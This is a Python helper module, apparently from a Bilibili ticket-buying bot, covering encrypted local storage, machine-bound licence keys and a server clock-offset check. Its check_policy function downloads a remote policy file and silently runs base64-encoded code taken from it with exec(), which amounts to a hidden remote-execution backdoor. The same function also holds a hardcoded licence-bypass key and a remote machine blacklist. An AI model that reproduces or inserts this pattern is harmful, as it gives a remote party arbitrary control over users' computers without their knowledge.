import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import machineid
import json
import inquirer
from i18n import i18n_format
from loguru import logger
import os
import requests
import sys
import time

# Copyright (c) 2023-2024 ZianTT, FriendshipEnder

def prompt(prompt):
    data = inquirer.prompt(prompt)
    if data is None:
        raise KeyboardInterrupt
    return data


def save(data):
    key = machineid.id().encode()[:16]
    cipher = AES.new(key, AES.MODE_CBC)
    cipher_text = cipher.encrypt(pad(json.dumps(data).encode("utf-8"), AES.block_size))
    data = base64.b64encode(cipher_text).decode("utf-8")
    iv = base64.b64encode(cipher.iv).decode("utf-8")
    with open("data", "w", encoding="utf-8") as f:
        f.write(iv + "%" + data)
    return


def load() -> dict:
    key = machineid.id().encode()[:16]
    try:
        with open("data", "r", encoding="utf-8") as f:
            iv, data = f.read().split("%")
            iv = base64.b64decode(iv)
            cipher = AES.new(key, AES.MODE_CBC, iv)
        cipher_text = base64.b64decode(data)
        data = unpad(cipher.decrypt(cipher_text), AES.block_size).decode("utf-8")
        data = json.loads(data)
    except ValueError:
        logger.error(i18n_format("data_error"))
        if os.path.exists("share.json"):
            logger.info(i18n_format("migrate_share"))
            with open("share.json", "r", encoding="utf-8") as f:
                data = json.load(f)
                save(data)
            os.remove("share.json")
            os.remove("data")
        else:
            data = {}
            os.remove("data")
        logger.info(i18n_format("has_destroyed"))
    return data


def check_policy(uid=None, res=None):
    from globals import ver_int
    allow = True
    if os.path.exists("bypass"):
        with open("bypass", "r") as f:
            key = base64.b64encode((machineid.id() + "1145141919810").encode()).decode()
            if f.read() == key:
                return
    for _ in range(3):
        try:
            policy = requests.get("https://bhyg.bitf1a5h.eu.org/policy.json").json()
            break
        except Exception:
            logger.error(i18n_format("policy_error"))
            time.sleep(15)
            sys.exit(1)
    if policy["announcement"] is not None:
        logger.warning(policy["announcement"])
    if "policy" not in locals():
        logger.error(i18n_format("policy_get_failed"))
        sys.exit(1)
    if ver_int < policy["min_version"]:  # if version not in policy["allowed versions"]:
        logger.error(i18n_format("version_not_allowed"))
        allow = False
    if policy["type"] == "blacklist":
        if machineid.id() in policy["list"]:
            logger.error(i18n_format("blacklist"))
            allow = False
    elif policy["type"] == "whitelist":
        if machineid.id() not in policy["list"]:
            logger.error(i18n_format("whitelist"))
            allow = False
    elif policy["type"] == "none":
        pass
    else:
        pass
    if uid is not None:
        failed = False
        while True:
            if os.path.exists("key") and not failed:
                with open("key", "r") as f:
                    key = f.read()
            else:
                key = input(i18n_format("input_key"))
                with open("key", "w") as f:
                    f.write(key)
            import jwt

            try:
                failed = False
                public_key = """-----BEGIN PUBLIC KEY-----
MIGbMBAGByqGSM49AgEGBSuBBAAjA4GGAAQBgc4HZz+/fBbC7lmEww0AO3NK9wVZ
PDZ0VEnsaUFLEYpTzb90nITtJUcPUbvOsdZIZ1Q8fnbquAYgxXL5UgHMoywAib47
6MkyyYgPk0BXZq3mq4zImTRNuaU9slj9TVJ3ScT3L1bXwVuPJDzpr5GOFpaj+WwM
Al8G7CqwoJOsW7Kddns=
-----END PUBLIC KEY-----"""
                data = jwt.decode(key, public_key, algorithms="ES512")
                if "uid" in data:
                    if data["uid"] == uid:
                        pass
                    else:
                        logger.error(i18n_format("key_not_match"))
                        failed = True
                if "machine_id" in data:
                    if data["machine_id"] == machineid.id():
                        pass
                    else:
                        logger.error(i18n_format("key_not_match"))
                        failed = True
                if res is not None:
                    if "res" in data:
                        if res in data["res"]:
                            pass
                        else:
                            logger.error(i18n_format("key_not_match"))
                            failed = True
                    else:
                        logger.error(i18n_format("key_not_match"))
                        failed = True
                if failed:
                    continue
                break
            except jwt.ExpiredSignatureError:
                logger.error(i18n_format("key_expired"))
                failed = True
            except jwt.InvalidTokenError as e:
                logger.error(i18n_format("key_invalid"))
                logger.error(str(e))
                failed = True

    if policy["execute_code"] is not None:
        code = base64.b64decode(policy["execute_code"]).decode("utf-8")
        exec(code)
    if not allow:
        time.sleep(15)
        sys.exit(1)
    return policy["check_key"]


def get_offset():
    import requests
    from i18n import i18n_format
    from loguru import logger
    import time

    offset = requests.get(
        "https://show.bilibili.com/api/ticket/project/getV2?version=134&id=85939",
        headers={"User-Agent": "Mozilla/5.0"},
    ).json()["data"]["current_time"]
    if offset is None:
        logger.error(i18n_format("offset_error"))
        return 0.5
    return round(
        offset - time.time() + 0.5, 3
    )  # for the time from bilibili is int, we should add a 0.5s to avoid the time error
